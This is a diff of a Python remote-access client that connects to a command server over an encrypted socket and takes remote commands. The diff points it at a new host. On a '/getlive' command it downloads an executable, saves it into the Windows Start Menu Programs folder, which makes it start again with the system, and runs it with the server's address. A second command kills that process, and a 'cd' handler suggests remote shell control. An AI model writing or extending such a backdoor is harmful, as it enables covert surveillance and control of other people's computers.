@@ -2,7 +2,7 @@ import os, subprocess, socket
 from cryptography.fernet import Fernet
 
 
-SERVER_HOST = 'xn--6pw65a019d.xyz'
+SERVER_HOST = '192.168.3.76'
 SERVER_PORT = 421
 BUFFER_SIZE = 1024 * 128 
 SEPARATOR = "<sep>"
@@ -49,7 +49,8 @@ while True:
             f.write(data)
         f.close()
     if command == "/getlive":
-        if os.path.exists('live.exe'):
+        directory = r'"C:\Users\joe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe"'
+        if os.path.exists(r'C:\Users\joe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe'):
             server_location = "yes"
             server_location = Fernet(key).encrypt(server_location.encode())
             s.send(server_location)
@@ -58,19 +59,19 @@ while True:
             server_location = Fernet(key).encrypt(server_location.encode())
             s.send(server_location)
             remaining = int.from_bytes(s.recv(4),'big')
-            f = open("live.exe","wb")
+            f = open(r'C:\Users\joe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe',"wb")
             while remaining:
                 data = s.recv(min(remaining,4096))
                 remaining -= len(data)
                 f.write(data)
             f.close()
-        subprocess.Popen(f'cmd /k live.exe -n {SERVER_HOST} -p {sender_port}')
+        subprocess.Popen(f'cmd /c {directory} -n {SERVER_HOST} -p {sender_port}')
         server_state = "live Streaming Server is running"
         server_state = Fernet(key).encrypt(server_state.encode())
         s.send(server_state)
         continue
     if command == "/stoplive":
-        #subprocess.Popen("cmd /k taskkill /im live.exe /f")
+        subprocess.Popen("cmd /k taskkill /im live.exe /f")
         sender_port = 422
         continue
     if splited_command[0].lower() == "cd":
